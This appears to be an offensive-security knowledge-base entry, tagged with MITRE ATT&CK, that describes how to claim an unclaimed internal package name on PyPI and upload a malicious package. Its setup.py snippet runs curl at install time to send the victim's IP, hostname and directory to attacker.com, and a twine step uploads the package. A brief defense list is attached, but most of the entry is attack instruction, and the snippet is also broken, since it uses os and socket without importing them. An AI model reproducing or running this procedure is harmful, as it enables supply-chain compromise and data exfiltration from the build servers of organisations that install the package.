---
id: proc-002
tags:
  - supply-chain
  - pypi
  - upload
type: procedure
tools:
  - '[[tools/pip]]'
tactics:
  - '[[TA0106]]'
commands:
  - '[[commands/twine-upload-pypi]]'
verified: false
platforms:
  - Linux
  - Python
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Compromise Software Supply Chain]]'
updated_at: '2025-12-14T17:24:17.665Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[TA0106]]'
mitre_techniques:
  - '[[Compromise Software Supply Chain]]'
---
---
# Claim-and-Upload-Malicious-PyPI-Package

## Summary

This procedure claims an unclaimed package name on PyPI and uploads a malicious version containing code in setup.py that executes during installation, such as sending a callback to an attacker-controlled server for RCE demonstration.

## Description

Once an internal package like 'yelp-cgeom' is identified as unclaimed, create a minimal package with a setup.py that includes a post-install script (e.g., using subprocess to curl a callback URL with system details). Upload via twine to PyPI. When misconfigured pip installs it, the script runs, exfiltrating data like IP, hostname, and directories from the build server.

## Requirements

1. PyPI account (free to create).
2. Python environment with setuptools and twine installed.
3. Attacker server endpoint for callbacks (e.g., webhook.site or self-hosted).

## Defense

Defensive measures and detection strategies:

- Monitor PyPI for claims of internal package names using alerts.
- Use pinned dependencies and hashes in requirements.txt to prevent unexpected versions.
- Scan build logs for unexpected package sources.

## Objectives

1. Hijack the package namespace on public PyPI.
2. Embed executable code for RCE on installation.
3. Receive confirmation of execution via callback.

## Instructions

### Step 1: Create Package Structure

**Context**: Set up a directory with setup.py containing malicious code.

Example setup.py snippet:

```python
import subprocess
subprocess.call(['curl', 'http://attacker.com/callback?ip=' + os.environ.get('HTTP_HOST', '') + '&host=' + socket.gethostname() + '&dir=' + os.getcwd()])
```

> This executes a curl to send details post-install.

### Step 2: Build and Upload Package

**Context**: Package and upload to PyPI using twine.

Execute [[commands/twine-upload-pypi]]:

```bash
python setup.py sdist bdist_wheel
twine upload dist/*
```

> Enter PyPI credentials when prompted. Expected output: 'Uploading distributions to https://upload.pypi.org/legacy/' and success message.

## MITRE ATT&CK Mapping

### Tactics

- [[TA0106]] Supply Chain Compromise

### Techniques

- [[Compromise Software Supply Chain]] Compromise Software Supply Chain: Compromise Software Development Tools

### Sub-Techniques


## Commands Used

- [[commands/twine-upload-pypi]]

## Tools Used

- [[tools/pip]]

## Tags

- [[supply-chain]]
- [[pypi]]
---
